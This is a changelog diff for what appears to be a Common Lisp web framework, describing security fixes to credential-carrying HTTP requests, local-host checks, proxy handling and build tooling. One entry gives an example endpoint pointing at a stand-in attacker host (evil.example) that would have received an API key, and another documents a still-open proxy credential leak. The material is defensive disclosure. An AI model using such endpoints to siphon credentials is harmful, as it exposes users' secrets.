@@ -14,12 +14,52 @@ its tag.
 
 ### An app may have to act
 
+- **hermes: `make-sendgrid` now checks its `:endpoint`, and refuses one a request should not carry
+  the API key to** (#1092). It was not checked at all before, so
+  `(make-sendgrid :endpoint "http://evil.example/v3/mail/send")` sent the key — a `Bearer`
+  credential in an `Authorization` header — in plaintext to whatever host was named. Refused now:
+  a value `quri` cannot parse, a scheme that is not `http` or `https`, any userinfo, no host, a
+  bracketed IPv6 host (which cannot be connected to), and plaintext `http` to a host this machine
+  or network cannot reach by itself. No refusal repeats the value, because it may hold a password.
+  **An app that set `:endpoint` to a plaintext remote host will now fail when the provider is
+  made** rather than on the first send. `:endpoint` is also readable now, as
+  `sendgrid-endpoint`.
+  **A query or fragment is allowed here**, unlike in a Twilio `api-base`: `deliver` sends this
+  value as the request URL exactly as it stands, so nothing can land inside one.
+
 - **hermes: a 429 from SendGrid or Twilio is now `delivery-rate-limited`, not a plain
   `delivery-failure`** (#79 step two). An app that caught `delivery-failure` still catches it,
   since `delivery-rate-limited` is a subtype, but one that *distinguished* a rate limit by
   reading `delivery-failure-status` can now match on the class, and read
   `delivery-rate-limited-retry-after` for the wait the response asked for. Telegram and Facebook
   already signalled it; every backend does now.
+
+- **A plaintext request to a local host is no longer sent through a proxy** (#1091, #1082).
+  dexador sets its proxy from `HTTPS_PROXY` or `HTTP_PROXY` when it loads and honours no
+  `NO_PROXY`, and nothing here passed `:proxy`, so a caller that had checked its destination was
+  local — hermes for a Twilio `api-base`, `hermes/blob` for an S3 endpoint — could still have its
+  credentials carried off the machine in the clear, because the bytes went to the proxy rather
+  than to the host that was checked. An `http` request to `localhost` or to a loopback, private
+  or link-local **address** is now sent with `:proxy nil`, by
+  `aion/http-client:proxy-arguments`, which **every** sender uses: `send-request` and
+  `hermes/blob`'s S3 backend, which calls dexador directly.
+  **An app that deliberately proxied plaintext requests to a local host will see them stop going
+  through the proxy.** https is unaffected, because a proxied https request is a `CONNECT` tunnel
+  and the credentials are inside TLS, and plaintext to a host that is not local is unaffected.
+  **A DNS NAME IS NOT COVERED, AND THAT CASE IS STILL OPEN.** A plaintext store or provider whose
+  host is a name — a Compose service such as `minio:9000`, or any name resolving to a loopback or
+  private address — is approved by the configuration-time check and then **still uses a configured
+  proxy**, so its requests go to that proxy in the clear, with the signed `Authorization` header
+  and any session token. That is **#1091**, which this does not close.
+  The send-time decision resolves no name on purpose: a lookup there is a blocking resolution
+  that `connect-timeout` does not cover, and a name that answers private now can answer public at
+  connect time, which would skip a configured egress proxy on the strength of a resolution that
+  no longer holds. The fix is for the configuration-time verdict to be carried to the send rather
+  than recomputed, which is what #1091 proposes. Until it lands, an app that must not send through
+  a proxy should address a local store **by IP address**, which is covered. Clearing the
+  environment variables works only before the image loads dexador, because it reads them once
+  into `dexador:*default-proxy*` when it loads (`defvar`, so unsetting them later changes
+  nothing); setting that variable to `nil` is the runtime equivalent.
 - **hermes/blob: an S3 endpoint that carries a user name or password is now refused when the
   store is made** (#1089). `MNEMOSYNE_S3_ENDPOINT` values such as `user:pw@host` or
   `[::1]@host` signal `blob-configuration-error`. An app that put userinfo in that variable has
@@ -1223,6 +1263,30 @@ its tag.
   `contrib-load-failure-p`, `contrib-failure-lines` and `explain-contrib-failure`.
 
 ### Added
+
+
+- **`aion/http-client:local-host-p` and `aion/http-client:url-host` are exported** (#1082).
+  `local-host-p` takes a host name or an IP address in text and says whether only this machine or
+  this network can reach it, which is the one question a caller must answer before sending
+  credentials in the clear. `url-host` reads a URL's host with `quri`, the parser dexador parses
+  a request URL with, and strips the brackets from an IPv6 host so the result can go straight to
+  `parse-address`.
+  **Both were written twice before this**, in hermes core for a Twilio `api-base` and in
+  `hermes/blob` for an S3 endpoint, and the two copies acquired different holes: a bracketed IPv6
+  address in the userinfo got past one, a scheme inside the endpoint got past the other, and a
+  bucket label in front of the host got past both (#1089, and the review of #1084). Both callers
+  now use these.
+  **`local-host-p` does not treat a 6to4 or NAT64 address as local**, although
+  `address-category` reports each by the IPv4 address it carries, so `2002:7f00:1::` and
+  `64:ff9b::7f00:1` are `:loopback` there. That is the right conservative answer for a guard
+  deciding whether a destination may be reached at all, and the wrong one here, because both
+  reach the IPv4 address through a relay or gateway that need not be this network's.
+  `address-category` is unchanged. **Nor is a host spelled as dotted-quad IPv4 with a leading
+  zero**, such as `010.8.8.8`: that is the one IPv4 spelling where this tree's parser and the
+  system resolver can disagree — the parser reads it as `10.8.8.8` and calls it private — and the
+  connection follows the resolver. Other non-canonical spellings (`127.1`, `0x7f.0.0.1`,
+  `2130706433`) are **kept**, because they go to the system resolver, which is the same resolver
+  the connection uses, so there is no second parser to disagree with.
 
 - **hermes: how long a send waits is now hermes's own setting, `*send-connect-timeout*` and
   `*send-read-timeout*`, both 10 seconds** (#1077). Each provider also takes `:connect-timeout`
@@ -3504,6 +3568,28 @@ its tag.
   `*pool*`, `*sessions*` and `*users*` are all `nil` afterwards. A project already generated
   keeps the old `open-database` in its own `src/db.lisp`; the change can be copied there by hand.
 
+- **macOS bundles: a carried dylib no longer keeps the build machine's path as its install
+  name** (#957). The tree's libuv was carried with the install name it was built with, an
+  absolute path under the build machine's `vendor/`, and a library the runtime links, such as
+  Homebrew's libzstd, kept its Homebrew path. Nothing loaded them by those names, but the
+  shipped files named paths on the build machine. `build-desktop-app.lisp` and `cons bin` now
+  set each carried dylib whose install name is an absolute path to
+  `@executable_path/<file name>` and re-sign it ad hoc, through the new
+  `ouranos-carry:stamp-install-name` in `scripts/carry-natives.lisp`. An install name that is
+  already relative, such as `./libpdfium.dylib`, is left as it is. When `otool` exits
+  non-zero on a Mach-O, as `/usr/bin/otool` does on a Mac without the Xcode Command Line Tools,
+  the build stops with `carry-refused` instead of carrying the file unchanged; the relink of
+  carried libraries that need each other stops the same way. When `install_name_tool` cannot
+  set the new name, because the header has no room for it, the library is carried as it was
+  and the build prints a warning. `build-desktop-app.lisp` now relinks the bundle's dylibs
+  against each other after all three carry steps, through the new
+  `ouranos-carry:relink-bundle`, because each step relinks only its own files: an app's
+  `--carry` library that links Homebrew's libzstd, such as libarchive or libcurl, would
+  otherwise have kept naming the Homebrew path once the runtime's libzstd was stamped, and
+  stopped with `Library not loaded` on a Mac without Homebrew.
+  `scripts/verify-bundle-macos.sh` warns, in its new check 1b, about any carried dylib whose
+  install name is an absolute path outside the bundle, and fails when it cannot read one.
+
 - **aion/http-client: a pinned https request refuses a certificate whose common name matches
   the host when its subject alternative names do not** (#917). On Linux and macOS, cl+ssl checks
   a certificate's common name whenever none of its alternative names match, which RFC 6125
@@ -4101,6 +4187,24 @@ its tag.
   3bmd does not treat an indented `>` as a quote in either mode, so `   > x` is still a
   paragraph. Raw HTML inside a quote is still shown as text,
   and a `>` in code is still escaped once. Every klio page changes the same way.
+
+- **`bootstrap.lisp` and `scripts/build-desktop-app.lisp` stop when an SBCL contrib the image
+  must carry does not load** (#1099). Both loaded `sb-cltl2`, `sb-bsd-sockets`, `sb-posix`,
+  `sb-rotate-byte`, `sb-md5`, `sb-introspect` and `sb-concurrency` inside `ignore-errors`, so a
+  contrib that failed to load was left out of `bin/cons` or the app image without a message,
+  and the image failed much later at the first `require` of it, for example with
+  `Don't know how to REQUIRE sb-posix.` Now each one must load and appear on `*modules*`, or
+  the script exits 1 before dumping, naming each contrib, its error, the directory SBCL looked
+  in and `SBCL_HOME`. The list and the check are in the new `scripts/bake-contribs.lisp`. The
+  check runs before `(require :asdf)`, and `asdf` is on the list, because ASDF is a contrib
+  too: with the contrib directory wrong, the scripts used to stop at
+  `Don't know how to REQUIRE ASDF` before any check ran. When `SBCL_HOME` is set, the advice
+  says to unset or correct it. The messages and `cons/docs/user-guide.md` now say that SBCL
+  ignores an `SBCL_HOME` that has no `contrib/` directory, and the user guide lists the other
+  places SBCL looks, in order, under "Which contrib directory": the executable's directory, its
+  `../lib/sbcl/`, the current directory, and the target of a symbolic link to the executable.
+  The current directory matters: `bin/cons` run from a directory that holds `contrib/` takes
+  that directory as its SBCL home.
 
 ## v0.1.7 — 2026-09-30
 
